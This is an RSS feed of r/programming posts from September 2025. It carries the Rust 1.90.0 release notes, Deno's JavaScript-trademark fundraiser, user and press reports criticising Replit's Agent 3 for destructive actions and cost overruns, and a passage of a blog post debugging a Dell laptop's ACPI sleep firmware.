<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="http://192.168.1.132/?platform=reddit&amp;subreddit=programming&amp;averagePostsPerDay=5&amp;content&amp;view=rss" rel="self" type="application/rss+xml"/><title>/r/programming</title><description>Hot posts in /r/programming (roughly 5 posts per day)</description><link>https://www.reddit.com/r/programming/</link><language>en-us</language><lastBuildDate>Fri, 19 Sep 2025 08:14:02 +0000</lastBuildDate><generator>Upvote RSS</generator><image><url>https://styles.redditmedia.com/t5_2fwo/styles/communityIcon_1bqa1ibfp8q11.png</url><title>/r/programming</title><link>https://www.reddit.com/r/programming/</link></image><item><link>https://blog.rust-lang.org/2025/09/18/Rust-1.90.0/</link><title>Announcing Rust 1.90.0 (blog.rust-lang.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/</guid><comments>https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1nklzrv/announcing_rust_1900/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.rust-lang.org/static/images/rust-social-wide.jpg' /></section><section class='parsed-content'><p>Sept. 18, 2025 &middot; The Rust Release Team </p><div><p>The Rust team is happy to announce a new version of Rust, 1.90.0. Rust is a programming language empowering everyone to build reliable and efficient software.</p><p>If you have a previous version of Rust installed via <code>rustup</code>, you can get 1.90.0 with:</p><pre><code><span>$ rustup update stable </span></code></pre><p>If you don't have it already, you can <a href="https://www.rust-lang.org/install.html">get <code>rustup</code></a> from the appropriate page on our website, and check out the <a href="https://doc.rust-lang.org/stable/releases.html#version-1900-2025-09-18">detailed release notes for 1.90.0</a>.</p><p>If you'd like to help us out by testing future releases, you might consider updating locally to use the beta channel (<code>rustup default beta</code>) or the nightly channel (<code>rustup default nightly</code>). Please <a href="https://github.com/rust-lang/rust/issues/new/choose">report</a> any bugs you might come across!</p><h2> What's in 1.90.0 stable</h2> <h2> LLD is now the default linker on <code>x86_64-unknown-linux-gnu</code></h2><p>The <code>x86_64-unknown-linux-gnu</code> target will now use the LLD linker for linking Rust crates by default. This should result in improved linking performance vs the default Linux linker (BFD), particularly for large binaries, binaries with a lot of debug information, and for incremental rebuilds.</p><p>In the vast majority of cases, LLD should be backwards compatible with BFD, and you should not see any difference other than reduced compilation time. However, if you do run into any new linker issues, you can always opt out using the <code>-C linker-features=-lld</code> compiler flag. Either by adding it to the usual <code>RUSTFLAGS</code> environment variable, or to a project's <a href="https://doc.rust-lang.org/cargo/reference/config.html"><code>.cargo/config.toml</code></a> configuration file, like so:</p><pre><code><span><span>[</span><span><span>target</span><span>.</span><span>x86_64-unknown-linux-gnu</span></span><span>]</span> </span><span><span><span>rustflags</span></span> <span>=</span> <span>[</span><span><span>"</span>-Clinker-features=-lld<span>"</span></span><span>]</span> </span></code></pre><p>If you encounter any issues with the LLD linker, please <a href="https://github.com/rust-lang/rust/issues/new/choose">let us know</a>. You can read more about the switch to LLD, some benchmark numbers and the opt out mechanism <a href="https://blog.rust-lang.org/2025/09/01/rust-lld-on-1.90.0-stable/">here</a>.</p><h3> Cargo adds native support for workspace publishing</h3><p><code>cargo publish --workspace</code> is now supported, automatically publishing all of the crates in a workspace in the right order (following any dependencies between them).</p><p>This has long been possible with external tooling or manual ordering of individual publishes, but this brings the functionality into Cargo itself.</p><p>Native integration allows Cargo's publish verification to run a build across the full set of to-be-published crates <em>as if</em> they were published, including during dry-runs. Note that publishes are still not atomic -- network errors or server-side failures can still lead to a partially published workspace.</p><h3> Demoting <code>x86_64-apple-darwin</code> to Tier 2 with host tools</h3><p>GitHub will soon <a href="https://github.blog/changelog/2025-07-11-upcoming-changes-to-macos-hosted-runners-macos-latest-migration-and-xcode-support-policy-updates/#macos-13-is-closing-down">discontinue</a> providing free macOS x86_64 runners for public repositories. Apple has also announced their <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_silicon#Timeline">plans</a> for discontinuing support for the x86_64 architecture.</p><p>In accordance with these changes, as of Rust 1.90, we have <a href="https://github.com/rust-lang/rfcs/pull/3841">demoted the <code>x86_64-apple-darwin</code> target</a> from <a href="https://doc.rust-lang.org/stable/rustc/platform-support.html#tier-1-with-host-tools">Tier 1 with host tools</a> to <a href="https://doc.rust-lang.org/stable/rustc/platform-support.html#tier-2-with-host-tools">Tier 2 with host tools</a>. This means that the target, including tools like <code>rustc</code> and <code>cargo</code>, will be guaranteed to build but is not guaranteed to pass our automated test suite.</p><p>For users, this change will not immediately cause impact. Builds of both the standard library and the compiler will still be distributed by the Rust Project for use via <code>rustup</code> or alternative installation methods while the target remains at Tier 2. Over time, it's likely that reduced test coverage for this target will cause things to break or fall out of compatibility with no further announcements.</p><h3> Stabilized APIs</h3> <ul> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.checked_sub_signed"><code>u{n}::checked_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.overflowing_sub_signed"><code>u{n}::overflowing_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.saturating_sub_signed"><code>u{n}::saturating_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.usize.html#method.wrapping_sub_signed"><code>u{n}::wrapping_sub_signed</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/num/enum.IntErrorKind.html#impl-Copy-for-IntErrorKind"><code>impl Copy for IntErrorKind</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/num/enum.IntErrorKind.html#impl-Hash-for-IntErrorKind"><code>impl Hash for IntErrorKind</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3C%26CStr%3E-for-CStr"><code>impl PartialEq&lt;&amp;CStr&gt; for CStr</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3CCString%3E-for-CStr"><code>impl PartialEq<cstring> for CStr</cstring></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CStr.html#impl-PartialEq%3CCow%3C'_,+CStr%3E%3E-for-CStr"><code>impl PartialEq<cow>&gt; for CStr</cow></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3C%26CStr%3E-for-CString"><code>impl PartialEq&lt;&amp;CStr&gt; for CString</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3CCStr%3E-for-CString"><code>impl PartialEq<cstr> for CString</cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/ffi/struct.CString.html#impl-PartialEq%3CCow%3C'_,+CStr%3E%3E-for-CString"><code>impl PartialEq<cow>&gt; for CString</cow></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3C%26CStr%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq&lt;&amp;CStr&gt; for Cow<cstr></cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3CCStr%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq<cstr> for Cow<cstr></cstr></cstr></code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/borrow/enum.Cow.html#impl-PartialEq%3CCString%3E-for-Cow%3C'_,+CStr%3E"><code>impl PartialEq<cstring> for Cow<cstr></cstr></cstring></code></a></li> </ul><p>These previously stable APIs are now stable in const contexts:</p><ul> <li><a href="https://doc.rust-lang.org/stable/std/primitive.slice.html#method.reverse"><code>&lt;[T]&gt;::reverse</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.floor"><code>f32::floor</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.ceil"><code>f32::ceil</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.trunc"><code>f32::trunc</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.fract"><code>f32::fract</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.round"><code>f32::round</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f32.html#method.round_ties_even"><code>f32::round_ties_even</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.floor"><code>f64::floor</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.ceil"><code>f64::ceil</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.trunc"><code>f64::trunc</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.fract"><code>f64::fract</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.round"><code>f64::round</code></a></li> <li><a href="https://doc.rust-lang.org/stable/std/primitive.f64.html#method.round_ties_even"><code>f64::round_ties_even</code></a></li> </ul> <h3> Platform Support</h3> <ul> <li><code>x86_64-apple-darwin</code> is now a tier 2 target</li> </ul><p>Refer to Rust&rsquo;s <a href="https://doc.rust-lang.org/rustc/platform-support.html">platform support page</a> for more information on Rust&rsquo;s tiered platform support.</p><h3> Other changes</h3><p>Check out everything that changed in <a href="https://github.com/rust-lang/rust/releases/tag/1.90.0">Rust</a>, <a href="https://doc.rust-lang.org/nightly/cargo/CHANGELOG.html#cargo-190-2025-09-18">Cargo</a>, and <a href="https://github.com/rust-lang/rust-clippy/blob/master/CHANGELOG.md#rust-190">Clippy</a>.</p><h2> Contributors to 1.90.0</h2><p>Many people came together to create Rust 1.90.0. We couldn't have done it without all of you. <a href="https://thanks.rust-lang.org/rust/1.90.0/">Thanks!</a></p></div></section>]]></description><pubDate>Fri, 19 Sep 2025 03:40:24 +0530</pubDate></item><item><link>https://deno.com/blog/javascript-tm-gofundme</link><title>Deno is raising $200k for the legal fight to free the JavaScript trademark from Oracle (deno.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/</guid><comments>https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1nkg6ph/deno_is_raising_200k_for_the_legal_fight_to_free/'>Post permalink</a></p></section><section class='preview-image'><img src='https://deno.com/blog/help-free-javascript-from-oracle/og.png' /></section><section class='parsed-content'><div><p>After more than <a href="https://javascript.tm/letter">27,000 people signed our open letter to Oracle</a> about the &ldquo;JavaScript&rdquo; trademark, we filed a formal <strong>Cancellation Petition</strong> with the US Patent and Trademark Office. Ten months in, we&rsquo;re finally reaching the crucial <strong>discovery phase</strong>.</p><p>Deno initiated this petition since we have legal standing as a JavaScript runtime, but it&rsquo;s really on behalf of all developers. If we win, &ldquo;JavaScript&rdquo; becomes public domain &ndash; free for all developers, conferences, book authors, and companies to use without fear of trademark threats.</p><p>We&rsquo;re asking for your support through our <a href="https://www.gofundme.com/f/help-us-challenge-oracles-javascript-trademark/donate">GoFundMe campaign</a> so we can put forward the strongest case possible.</p><h3>Why $200k?</h3><p>Because federal litigation is expensive. Discovery is the most resource-intensive stage of litigation, where evidence is collected and arguments are built.</p><p>We don&rsquo;t want to cut corners &ndash; we want to make the best case possible by funding:</p><ul> <li><strong>Professional public surveys</strong> that carry legal weight in front of the USPTO, proving that &ldquo;JavaScript&rdquo; is universally recognized as the name of a language, not Oracle&rsquo;s brand.</li> <li><strong>Expert witnesses</strong> from academia and industry to testify on JavaScript&rsquo;s history, usage, and meaning.</li> <li><strong>Depositions and records</strong> from standards bodies, browser vendors, and industry leaders showing Oracle has no role in the language&rsquo;s development.</li> <li><strong>Legal filings and responses</strong> to counter Oracle&rsquo;s claims at every step.</li> </ul><p>If there are leftover funds, we&rsquo;ll donate them to the <a href="https://openjsf.org/governance"><strong>OpenJS</strong></a> to continue defending civil liberties in the digital space. None of the funds will go to Deno.</p><h3>Oracle officially denies &ldquo;JavaScript&rdquo; is generic</h3><p>On August 6th, 2025, Oracle for the first time addressed the validity of the trademark. <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=16">Their response</a> to our <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=1">petition</a> denies that &ldquo;JavaScript&rdquo; is a generic term.</p><p>If you&rsquo;re a web developer, it&rsquo;s self-evident that Oracle has nothing to do with JavaScript. The trademark system was never meant to let companies squat on commonly-used names and rent-seek &ndash; it was designed to protect active brands in commerce. US law makes this distinction explicit.</p><p>We urge you to read <a href="https://ttabvue.uspto.gov/ttabvue/v?pno=92086835&amp;pty=CAN&amp;eno=1">our petition</a> and <a href="https://javascript.tm/letter">open letter</a> to understand our arguments.</p><p>If we don&rsquo;t win discovery, Oracle locks in ownership of the word &ldquo;JavaScript.&rdquo; This is the decisive moment.</p><p>But this case is bigger than JavaScript. It&rsquo;s about whether trademark law works as written, or whether billion-dollar corporations can ignore the rule that trademarks cannot be generic or abandoned. &ldquo;JavaScript&rdquo; is obviously both. If Oracle wins anyway, it undermines the integrity of the whole system.</p><p>Let&rsquo;s make sure the law holds. <a href="https://www.gofundme.com/f/help-us-challenge-oracles-javascript-trademark/donate">Please donate</a>. Please share and upvote this.</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 23:56:18 +0530</pubDate></item><item><link>https://old.reddit.com/r/replit/comments/1nidmhr/ongoing_agent_3_feedback_megathread/</link><title>"The agent kept “working” for more than an hour at a time without ever reaching a solution. Worse, instead of fixing the bug, it started introducing regressions and damaging the project, at one point even deleting a critical file like storage." (old.reddit.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/</guid><comments>https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nk8dmc/the_agent_kept_working_for_more_than_an_hour_at_a/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.redditstatic.com/new-icon.png' /></section><section class='parsed-content'><div><p>I developed a browser game almost entirely with Agent 2 between April and July. Even though I&rsquo;m not a developer, the game went through an external audit and was rated 6/10, not perfect but stable and functional. Since then, I&rsquo;ve been running a slow and controlled beta test with about 250 organic users, who provide feedback that I use to gradually release new features.</p><p>Recently, some users reported a bug that prevented them from progressing from one level to the next. I decided to rely on Agent 3, in build mode, to try to fix it. Unfortunately, the experience was very disappointing. The agent kept &ldquo;working&rdquo; for more than an hour at a time without ever reaching a solution. Worse, instead of fixing the bug, it started introducing regressions and damaging the project, at one point even deleting a critical file like <em>storage</em>. Rollbacks didn&rsquo;t work, and I ended up spending an entire weekend watching the agent literally break my app instead of improving it. Eventually, I managed to restore a stable version manually, but it was very difficult, and at this point I&rsquo;ve lost trust in letting it touch my code again.</p><p>The difference compared to Agent 2 was striking. With the old agent, I was getting more reliable results and felt confident enough to proceed with deploys. With Agent 3, the process has been inefficient and destructive.</p><p>On top of this comes the issue of costs. Before September 11th, with Agent 2, my expenses were reasonable and in line with the value I was getting. With Agent 3, however, in just one weekend of failed attempts the costs skyrocketed, without any concrete results. I&rsquo;ve attached a screenshot that clearly shows the difference in spending pre and post September 11th.</p><p>I think the team needs to urgently address two points. First, make Agent 3 more reliable in build mode so it doesn&rsquo;t introduce regressions or delete files. Second, ensure greater transparency and sustainability in pricing, because watching the agent get stuck &ldquo;working endlessly&rdquo; while costs spin out of control is not sustainable for anyone trying to build a project.</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 19:01:14 +0530</pubDate></item><item><link>https://www.theregister.com/2025/09/18/replit_agent3_pricing/?&amp;&amp;&amp;ICID=ref_fark</link><title>Replit infuriating customers with surprise cost overruns - What happens when AI becomes essential and unaffordable? (theregister.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/</guid><comments>https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nk7ywk/replit_infuriating_customers_with_surprise_cost/'>Post permalink</a></p></section><section class='preview-image'><img src='https://regmedia.co.uk/2024/09/02/shutterstock_frustrated_software_developer.jpg' /></section><section class='parsed-content'><div><p>AI coding service Replit is in trouble again as users are protesting steep cost increases and some glitches when employing the newest version of its service.</p><p>Readers may remember Replit for <a href="https://www.theregister.com/2025/07/22/replit_saastr_response/">deleting</a> one of its customers&rsquo; production databases and making up data.</p><p>The company promised to move on from that mess, and on September 10 launched Agent 3, a coding helper that it says offers developers an easier way to build and test apps.</p><p>Feedback on the new service, which Replit <a href="https://blog.replit.com/introducing-agent-3-our-most-autonomous-agent-yet">billed</a> as &ldquo;our most advanced and autonomous Agent yet&rdquo; and &ldquo;3x faster and 10x more cost-effective than Computer Use models&rdquo;, has been mixed, with the main complaint being that certain tasks take longer, and involve more checkpoints, so therefore cost surprisingly more.</p><p>"I think it&rsquo;s just launch pricing adjustment &ndash; some tasks on new apps ran over 1hr 45 minutes and only charged $4-6 but editing pre-existing apps seems to cost most overall (I spent $1k this week alone)" one user told <i>The Register</i>.</p><p>This person theorized, "I think they're running a lot more under the hood with subagents which probably costs them more, but on older code where you're sort of 'editing as you go' and then having it reviewing old parts of your codebase (especially with very large files), it seems to charge a lot more than just asking for new app builds - it often calls many sub agents to review the code, plan the code, check for security, execute, then fix its issues and review thousands of lines - so it feels like $2-$4 each time it does something now on prior projects. Even asking it to reset a server and wait it charges $0.40-$0.50 on average. Interestingly, in new chats for brand new apps you can ask it to build, it doesn't do this as much. "</p><p>A Reddit <a href="https://www.reddit.com/r/replit/comments/1nidmhr/ongoing_agent_3_feedback_megathread/">megathread</a> contains many more reports of users who say their Replit bills rose rapidly once the new service commenced.</p><p>One user wrote, "Before September 11th, with Agent 2, my expenses were reasonable and in line with the value I was getting. With Agent 3, however, in just one weekend of failed attempts the costs skyrocketed, without any concrete results.".</p><p>"I typically spent between $100-$250/mo. I blew through $70 in a night at Agent 3 launch,&rdquo; another Redditor wrote, alleging the new tool also performed some questionable actions. &ldquo;One prompt brute forced its way through authentication, redoing auth and hard resetting a user's password to what it wanted to perform app testing on a form," the user wrote.</p><p>"Other prompt redesigned the complete app in a new UI that it made up. I stopped immediately after that because the one prompt was $20 that ruined my UI. I'd typically go through ~10 prompts/night, so at the rate it was going, it'd be around a 20x increase in cost monthly."</p><p>Part of the problem might be with Replit's June introduction of "<a href="https://blog.replit.com/effort-based-pricing">effort-based pricing</a>.Previously, it would charge $0.25 for each checkpoint, and a task with multiple checkpoints would simply be tallied up one by one to arrive at a total cost. But with effort-based pricing, it now bundles complicated tasks into a single more expensive checkpoint. The next month, Replit <a href="https://blog.replit.com/effort-based-pricing-recap">admitted</a> "can end up being more expensive over the lifetime of a project." But the costs didn't really seem to hit users until Agent 3.</p><p>"The effort-based pricing never ran me as much before but Agent 3 has been exceptionally high," explained the user we spoke to.</p><p>"In the last week alone it charged me $1K since the new agent dropped whereas before it was never more than $180-200 a month for the same effort. It's exceptionally fair pricing with Agent 3 if you're running a brand new app. But if you have a pre-existing app and are editing along the way, pricing seems absolutely abhorrent.&rdquo;</p><ul> <li><a href="https://www.theregister.com/2025/07/22/replit_saastr_response/">Replit makes vibe-y promise to stop its AI agents making vibe coding disasters</a></li> <li><a href="https://www.theregister.com/2025/07/21/replit_saastr_vibe_coding_incident/">Vibe coding service Replit deleted user's production database, faked data, told fibs galore</a></li> <li><a href="https://www.theregister.com/2025/09/09/ai_darwin_awards/">AI Darwin Awards launch to celebrate spectacularly bad deployments</a></li> <li><a href="https://www.theregister.com/2025/07/25/opinion_column_vibe_coding/">Caught a vibe that this coding trend might cause problems</a></li> </ul><p>Replit is a venture-backed startup, and may be feeling pressure to increase revenue. On the same day it launched Agent 3 the company <a href="https://www.prnewswire.com/in/news-releases/replit-closes-250-million-in-funding-to-build-on-customer-momentum-302551540.html">announced</a> $250 million in funding from investors including Prysm Capital and Google's AI Futures Fund.</p><p>"With the raise and our new AI Agent, we are positioned to supercharge customer traction to become the standard for enterprises," Replit CEO Amjad Masad said at the time, before declaring "The future is exciting with millions &ndash; if not billions &ndash; of people bringing their ideas to life with a few clicks."</p><p>But it's those purportedly few clicks that seem to be causing problems for users.</p><p>We've asked Replit for clarification of the changes to Agent 3 and pricing and will amend this story upon their response. &reg;</p></div></section>]]></description><pubDate>Thu, 18 Sep 2025 18:44:34 +0530</pubDate></item><item><link>https://triangulatedexistence.mataroa.blog/blog/i-uncovered-an-acpi-bug-in-my-dell-inspiron-5667-it-was-plaguing-me-for-8-years/</link><title>I uncovered an ACPI bug in my Dell Inspiron 5567. It was plaguing me for 8 years. (triangulatedexistence.mataroa.blog)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/</guid><comments>https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1njzx0o/i_uncovered_an_acpi_bug_in_my_dell_inspiron_5567/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><p>Imagine you close your laptop lid to put it to sleep, but instead of pausing, it reboots. Not every time, just often enough to be infuriating. You try to save your work, but the machine decides to start over. </p><p>For eight years, this has been the reality of using my Dell Inspiron 5567. A bug I couldn't explain, happening across every OS I installed. This is the story of how I dug into the firmware's source code and found the single, flawed command responsible.</p><h2>Intro</h2><p>This laptop has been my companion since I was in 7th grade. It's the machine where I learned everything from C++ to Python. When it couldn't upgrade to Windows 11, I gave it a new life with Linux Mint. While that came with its own set of technical puzzles to solve, one bug has been a constant frustration across every OS: S3 Sleep.</p><h2>The Bug</h2><p>Whenever I put my laptop to sleep, it was a gamble. Sometimes, instead of pausing, it would completely restart. This happened whether I closed the lid or let it idle. </p><p>Since the bug persisted across both Windows and Linux, I knew the fault wasn't in the operating system, but something much deeper: the firmware itself.</p><h2>Ignition of spark</h2><p><a href="https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive">https://github.com/Zephkek/Asus-ROG-Aml-Deep-Dive</a></p><p>Literally this GitHub repo. Just check this out, it's the thing I needed. I knew that it was an ACPI fault, but I needed to know how to read the code from the ACPI tables.</p><p>In Linux (and even in Windows), this boils down to these two commands:</p><div><pre><span># Extract all ACPI tables into binary .dat files; sudo for admin privileges in Linux</span> sudoacpidump<span> </span>-b <span># Decompile the main table into human-readable ACPI Source Language (.dsl)</span> iasl-d<span> </span>*.dat </pre></div><p>This is it.</p><h2>Raw code around the main problem point</h2><p>I found "Method(_PTS" under <code>dsdt.dsl</code>. In fact, everything is under <code>dsdt.dsl</code>. </p><p>Note: </p><ul> <li><p>I've taken all the function calls properly and ensured that I can show you the entire process. </p></li> <li><p>I haven't shown the scopes; I have just shown the methods.</p></li> <li><p>The indentation has also been preserved to distinguish one method from the other.</p></li> </ul><pre><code> Method (_PTS, 1, NotSerialized) // _PTS: Prepare To Sleep { If (Arg0) { PTS (Arg0) \_SB.TPM.TPTS (Arg0) \_SB.PCI0.LPCB.SPTS (Arg0) \_SB.PCI0.NPTS (Arg0) RPTS (Arg0) } } Method (PTS, 1, NotSerialized) { } Method (TPTS, 1, Serialized) { Switch (ToInteger (Arg0)) { Case (0x04) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } Case (0x05) { RQST = Zero FLAG = 0x09 SRSP = Zero SMI = OFST /* \OFST */ Return (SRSP) /* \_SB_.TPM_.SRSP */ } } } Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } Method (NPTS, 1, NotSerialized) { PA0H = PM0H /* \_SB_.PCI0.PM0H */ PALK = PMLK /* \_SB_.PCI0.PMLK */ PA1H = PM1H /* \_SB_.PCI0.PM1H */ PA1L = PM1L /* \_SB_.PCI0.PM1L */ PA2H = PM2H /* \_SB_.PCI0.PM2H */ PA2L = PM2L /* \_SB_.PCI0.PM2L */ PA3H = PM3H /* \_SB_.PCI0.PM3H */ PA3L = PM3L /* \_SB_.PCI0.PM3L */ PA4H = PM4H /* \_SB_.PCI0.PM4H */ PA4L = PM4L /* \_SB_.PCI0.PM4L */ PA5H = PM5H /* \_SB_.PCI0.PM5H */ PA5L = PM5L /* \_SB_.PCI0.PM5L */ PA6H = PM6H /* \_SB_.PCI0.PM6H */ PA6L = PM6L /* \_SB_.PCI0.PM6L */ } Method (RPTS, 1, NotSerialized) { P80D = Zero D8XH (Zero, Arg0) ADBG (Concatenate ("_PTS=", ToHexString (Arg0))) If ((Arg0 == 0x03)) { If (CondRefOf (\_PR.DTSE)) { If ((\_PR.DTSE &amp;&amp; (TCNT &gt; One))) { TRAP (0x02, 0x1E) } } } If ((IVCM == One)) { \_SB.SGOV (0x02040000, Zero) \_SB.SGOV (0x02010002, Zero) } If (CondRefOf (\_SB.TPM.PTS)) { \_SB.TPM.PTS (Arg0) } EV1 (Arg0, Zero) } </code></pre> <h2>Explaining the problem in this raw code</h2><p>After decompiling the tables, I began to trace the <code>_PTS</code> (Prepare To Sleep) method. It acts as a simple dispatcher, calling a sequence of other methods to prepare different hardware components. </p><p>Most of these were dead ends: the local <code>PTS</code> method was completely empty, and the methods for the Northbridge (<code>NPTS</code>) and Root Ports (<code>RPTS</code>) were just performing standard state-saving and debug routines. </p><p>The logic for the TPM was more interesting, but it only contained specific instructions for hibernate (S4) and shutdown (S5), doing nothing for S3 sleep. None of these were the culprit.</p><p>The main problem is about to show up, the Southbridge:</p><pre><code>Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } </code></pre><p>No, not this one. I'll show you a pseudocode:</p><div><pre><span>/*</span> <span>================================================================================</span> <span> Southbridge_PrepareToSleep: The Buggy Method</span> <span> This function is called to give the final "go to sleep" command to the</span> <span> motherboard's main power controller, which lives in the Southbridge.</span> <span>================================================================================</span> <span>*/</span> <span>void</span><span>Southbridge_PrepareToSleep</span><span>(</span><span>int</span><span> sleep_state) {</span> <span>// THE CORE LOGICAL ERROR:</span> <span>// This function needs to perform two steps in order:</span> <span>// 1. Set the hardware's "sleep_type_register" to tell it if we want</span> <span>// S3 (pause/suspend) or S5 (stop/shutdown).</span> <span>// 2. Set the "sleep_enable_bit" to tell the hardware to "GO NOW".</span> <span>//</span> <span>// This code completely skips Step 1.</span> <span>// ----------------- THE ACTUAL BUGGY CODE -----------------</span> <span>// This line sets a secondary, auxiliary flag. It is NOT the main command</span> <span>// that tells the hardware which sleep state to enter.</span> <span> SOUTHBRIDGE.some_sleep_flag </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: SLPX = One</span> <span>// THIS IS STEP 2 - THE "GO" BUTTON.</span> <span>// The code triggers the sleep transition immediately, without having</span> <span>// set the destination (sleep type) first. This is the root of the bug.</span> <span> SOUTHBRIDGE.sleep_enable_bit </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: SLPE = One</span> <span> </span><span>// This 'if' block is the firmware's broken attempt to handle S3.</span> <span>// It sets another minor flag but still fails to set the main hardware</span> <span>// sleep_type_register, so the hardware never gets the primary command.</span> <span>if</span><span> (sleep_state </span><span>==</span><span> S3_SUSPEND) {</span> <span> SOUTHBRIDGE.acpi_s3_enable_flag </span><span>=</span><span>1</span><span>; </span><span>// Original ASL: AES3 = One</span> <span> }</span> <span>}</span> </pre></div><blockquote><p>This is the only method in the entire sequence that unconditionally writes to what is clearly the main sleep trigger register (SLPE). The other methods are all responsible for saving state or handling their own specific hardware. SPTS is the one that recklessly pushes the "Go" button for the whole system without properly setting up the "Go where?" part first. </p></blockquote><p>Let me explain some more.</p><p>Assigning SLPE to One literally instructs the motherboard, "Hey buddy, I have taken care of the rest, you can shut down everything else."</p><p><strong>You need to realise that <code>SLPE = One</code> is more like a <code>return</code> statement, except that it instructs the motherboard to shut down. In normal programming terms, don't put any sort of statements after <code>SLPE = One</code>, all of them will be randomly futile.</strong></p><p>To understand the severity of this bug, we need to look at what <code>SLPE = One</code> actually does. The southbridge physically contains the dedicated hardware block that controls the motherboard's power rails. When you tell the computer to enter S3 sleep, the southbridge's PMC is what actually cuts power to the CPU, RAM (partially), fans, and other components. The SLPE (Sleep Enable) bit is a direct command to this specific piece of hardware.</p><h2>S3 (Deep Sleep) vs S5 (Shutdown)</h2><p>We know that our _PTS dispatcher method executes like this:</p><pre><code> Method (_PTS, 1, NotSerialized) // _PTS: Prepare To Sleep { If (Arg0) { PTS (Arg0) \_SB.TPM.TPTS (Arg0) \_SB.PCI0.LPCB.SPTS (Arg0) \_SB.PCI0.NPTS (Arg0) RPTS (Arg0) } } </code></pre><p>So, the flow is like this: PTS (Literally an empty method) -&gt; TPTS (TPM) -&gt; SPTS (Southbridge) -&gt; NPTS (Northbridge) -&gt; RPTS (Root Port).</p><p>Now, let's look at our SPTS code.</p><pre><code> Method (SPTS, 1, NotSerialized) { SLPX = One SLPE = One If ((Arg0 == 0x03)) { AES3 = One } } </code></pre><p>Here, S3 isn't covered. A conditional branch is executed after <code>SLPE = 